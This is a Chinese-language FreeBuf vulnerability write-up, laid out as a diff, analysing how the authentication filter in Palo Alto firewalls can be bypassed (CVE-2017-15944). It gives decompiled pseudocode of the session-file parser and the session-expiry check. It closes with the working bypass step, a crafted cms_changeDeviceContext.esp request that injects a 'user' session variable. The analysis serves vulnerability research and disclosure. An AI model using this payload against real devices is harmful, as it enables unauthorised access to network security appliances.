@@ -1,0 +1,67 @@
+*本文原创作者：xmwanth，本文属FreeBuf原创奖励计划，未经许可禁止转载
+这篇文章是对Palo Alto防火墙产品未授权远程代码执行漏洞（CVE-2017-15944 ）中授权验证功能绕过漏洞的详细技术分析。之前clouds已经对该漏洞进行了介绍和分析（http://www.freebuf.com/vuls/157319.html），这篇文章主要是补充一下漏洞的原理和关键点。
+一、Palo Alto中Appweb服务器的认证模块panAuthFilter
+1、Appweb服务器的数据流
+2、Palo Alto中Appweb配置文件关键配置信息
+#加载/usr/local/lib/shobjs/libpanApiWgetFilter.so模块，名称为panAuthFilter LoadModule panAuthFilter libpanApiWgetFilter #将panAuthFilter过滤器添加到Appweb的数据流中 AddOutputFilter panAuthFilter #在以下路径中开启认证保护，所以，在正常情况下，访问这些路径下的文件必须经过认证 <Location /php/monitor> SetHandler phpHandler panAuthCheck on </Location> <Location /php/utils> SetHandler phpHandler panAuthCheck on </Location> <Location /php> panAuthCheck on </Location> <Location /PAN_help> panAuthCheck on </Location>
+3、panAuthFilter中的关键函数
+libpanApiWgetFilter中其实包含了两个Filter，对于panAuthFilter这个Filter而言，主要包含以下几个函数：
+（1）maPanAuthFilterInit函数：Filter加载时的入口函数，通过设置Filter结构体，指定下面的几个事件处理函数，该函数只在模块加载时调用一次；
+（2）parseAuthFilter函数：该函数在模块加载时调用一次，主要是对配置文件中的配置选项进行解析处理；
+（3）matchAuthFilter函数：该函数在所有WEB文件访问时，都会调用。该函数的返回值决定了是否调用openAuthFilter函数和closeAuthFilter函数；
+（4）openAuthFilter函数：该函数在matchAuthFilter函数返回1时调用，认证功能主要在这个函数中；
+（5）closeAuthFilter函数：该函数在matchAuthFilter函数返回1时调用，主要是释放资源。
+二、认证关键代码
+这一部分主要介绍panAuthFilter过滤器认证的关键代码实现。
+1、matchAuthFilter函数
+当Appweb接受到任何一个文件请求时，首先进入matchAuthFilter函数，该函数的逻辑如下：
+if (strstr(uri, "login.")!=0) || (strstr(uri, "logout.")!=0) return 0 esle return 1
+在访问的文件路径中，如果包含"login."或者"logout."，则返回0，后面就无需进入openAuthFilter函数进行认证。否则，进入openAuthFilter开始认证验证。
+2、openAuthFilter函数
+（1）调用getCookieValues函数，解析Cookie，获取PHPSESSID和_appwebSessionId_的数值，并通过maSetStageData函数分别命为"panAuthFilter.PHPSESSID"、"panAuthFilter._appwebSessionId_"。对于该漏洞，必须设置PHPSESSID。
+（2）调用readSessionVarsFromFile,第一是读取/tmp/sess_PHPSESSID(这里是具体的PHPSESSID的数值)文件内容，第二是对内容进行解析，获取user和dloc数值。对于该漏洞，重点是设置user。
+1）SESSION的文件内容形式如下：
+skey|ptType:str_length:"tSkeyValue";skey|ptType:str_length:"tSkeyValue";
+其中skey是变量名，ptType是变量类型（有a,s等类型），str_length是tSkeyValue长度，tSkeyValue为具体数值。
+一个实例： 文件名称：/tmp/sess_39ee0c75f7f26a5eee0230bc1f852779 文件内容：locale|s:5:"zh_CN";dloc|s:23:"8:localhost.localdomain";loc|s:23:"8:localhost.localdomain";
+2）解析文件内容的关键处理逻辑如下，该函数在解析变量时，存在的一个缺陷就是未对str_length做任何处理和验证。
+char *remaing = NULL; char *remaing2 = NULL; char *skey; skey = strtok_r(session_string, "|", &remaing); //寻找session中的第一个“|"字符，获取第一个数据名称skey next_string: if (skey == 0) goto ana_end; if (remaining ==0) goto ana_end; ptType = strtok_r(remaing, ":", &remaing2); //寻找下一个":"，获取数据类型ptType if (ptType == 0) goto ana_end; strtok_r(0, ":", &remaing2); //寻找下一个":"，获取数据长度str_length，但这里未对返回值进行保存和处理，这是能够造成绕过的原因之一 if *(byte*(ptType)) == 'a' //判断数据类型ptType的第一字母是否为'a' goto a_type; //对类型a的处理，处理完之后，循环进入next_string，该代码中未给出，不影响分析 tSkeyValue = strtok_r(0, ";", &remaing2): //寻找分号";" if *(byte*(ptType)) == 's' //判断数据类型ptType的第一字母是否为's' goto not_s_type; //对不是类型s的处理，处理完之后，循环进入next_string，该代码中未给出，不影响分析 //当前变量解析完毕，查看是否为"dloc"和"user" tSkey = NULL; if skey == "dloc" tSkey = "panAuthFilter.dloc" else if skey == "user" tSkey = "panAuthFilter.user" if tSkey == NULL //判断当前解析变量是否为"dloc"或者"user" goto pre_next if tSkeyValue == NULL goto pre_next if *(byte*)tSkeyValue == 0 //此时，已经确定当前变量为"dloc"或者"user"；判断该变量字符串是否为空 goto pre_next //设置"panAuthFilter.dloc"或者"panAuthFilter.user" //对tSkeyValue进行一定处理后 maSetStageData(tSkey, tSkeyValue) //后面可以通过maGetStageData(tSkey)函数进行读取 pre_next: skey = strtok_r(0, "|", remaing2); //开启寻找下一个变量 remaing = remaing2; if skey == 0 goto ana_end if *(byte*)skey == 0Ah goto ana_end goto next_string //进入下一个变量解析 //结束处理，函数返回 ana_end: return
+（3）判断needAuth变量，系统配置不需要验证就可访问的文件，再此处进行区分。如果不需要认证就可访问，则直接返回，不需要后面的认证步骤。
+（4）判断是否设置"panAuthFilter.user"，如果未设置，表示未通过验证。
+（5）调用panCheckSessionExpired函数，该函数返回值如果是2，则未通过认证；如果不是2，则认证成功。只判断返回值是不是2，这也是造成绕过的重要原因之一，后面会看到。
+1)调用_panSwalApiRequestWithTimeout构建xml，其中cookie的数值就是设置的"panAuthFilter.user"的值（通过session中user变量的值得来）
+<request cmd='op' cookie='16:bbbb' refresh='no'> <operations xml='yes'> <show><cli><idle-timeout/></cli></show> </operations> </request>
+2）调用panSwalApiRequestWithTimeout函数
+在该函数中通过向PaloAlto本地开启的10000号端口发送构建的xml，读取返回的数值，返回数值也是xml格式
+[root@PA-VM htdocs]# netstat -antp | grep 10000 tcp 0 0 127.0.0.1:60399 127.0.0.1:10000 ESTABLISHED 2562/logrcvr tcp 0 0 127.0.0.1:60413 127.0.0.1:10000 ESTABLISHED 2516/devsrvr tcp 0 0 :::10000 :::* LISTEN 2731/mgmtsrvr tcp 0 0 ::ffff:127.0.0.1:10000 ::ffff:127.0.0.1:60399 ESTABLISHED 2731/mgmtsrvr tcp 0 0 ::ffff:127.0.0.1:10000 ::ffff:127.0.0.1:60413 ESTABLISHED 2731/mgmtsrvr
+调用panSwalClientSendAndReadWithTimeout后，返回的xml格式有如下几种格式：
+未通过认证的返回xml:
+<response status="unauth" code="22"> <msg><line>Session timed out</line></msg> </response>
+通过认证的返回xml：
+<response status ="success"> <result> <idle-timeout>3600</idle-timeout><remaining>3568</remaining> </result> </response>
+发送的xml格式有错误时的返回xml：
+<response status="error" code="18"> <msg> <line>Malformed Request</line> </msg> </response>
+3）调用panSwalRspEval函数，对返回的xml格式进行解析，该函数的返回值，就是panCheckSessionExpired函数的返回值
+通过函数调用序列：panSwalRspEval->clone_panSwalRspEval->clone_panSwalRspEval->parseSwalRsp->clone_parseSwalRsp
+最后在clone_parseSwalRsp函数中，对xml中的status进行解析
+如果为success，则status变量=0 如果为unauth，则status变量=2 如果为其他，则status变量=1
+该status的数值，就是panSwalRspEval的返回值，也是panCheckSessionExpired的返回值。
+三、认证饶过
+通过上面的分析，只要我们构造出一个session，利用readSessionVarsFromFile函数解析变量的缺陷，从中解析出user变量；通过该变量构造出一个错误的xml格式内容，让panCheckSessionExpired返回1，就可以绕过认证。
+/esp/cms_changeDeviceContext.esp可以不经过认证直接访问，另外该函数可以设置dloc session变量（原理在下篇文章中进行分析）。
+1）构造、访问URL：https://ip/esp/cms_changeDeviceContext.esp ?device=aaaa:bbbb'";user|s:
+2）读取session内容
+dloc|s:15:"8:bbbb'";user|s";loc|s:22:"16:bbbb'";user|s:vsys1";
+3）如果正确解析，解析成的变量为：
+dloc|s:15:"8:bbbb'";user|s" loc|s:22:"16:bbbb'";user|s:vsys1"
+但是由于readSessionVarsFromFile解析缺陷，解析出的变量为：
+dloc|s:15:"8:bbbb'"; user|s";loc|s:22:"16:bbbb'"; user|s:vsys1";解析错误
+这里可以看到，成功解析出user变量。
+4)user的数值为"16:bbbb'"，设置"panAuthFilter.user"的数值为"16:bbbb'"
+5）构造的xml格式数据为：
+<request cmd='op' cookie='16:bbbb'' refresh='no'> <operations xml='yes'> <show><cli><idle-timeout/></cli></show> </operations> </request>
+由于单引号的存在，该xml格式错误
+6)发送后，返回的xml格式数据为：
+<response status="error" code="18"> <msg> <line>Malformed Request</line> </msg> </response>
+7)panCheckSessionExpired返回数值为1，绕过认证。
+*本文原创作者：xmwanth，本文属FreeBuf原创奖励计划，未经许可禁止转载
